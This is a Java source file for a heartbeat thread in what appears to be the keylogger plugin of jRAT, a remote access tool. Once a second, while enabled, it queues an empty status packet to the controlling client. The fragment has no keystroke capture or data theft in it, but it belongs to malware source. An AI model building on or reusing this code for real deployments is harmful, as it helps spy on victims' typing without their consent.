package jrat.plugin.keylogger.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.Client;
import jrat.api.net.PacketBuilder;

public class HeartbeatThread implements Runnable {

	private boolean enabled;
	private Client server;

	public HeartbeatThread(Client server) {
		this.server = server;
		this.enabled = true;
	}

	public void toggle() {
		enabled = !enabled;
	}

	@Override
	public void run() {
		try {
			while (enabled) {

				Thread.sleep(1000L);

				if (!enabled) {
					break;
				}

				server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.STATUS_HEADER, server) {
					@Override
					public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {

					}
				});

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
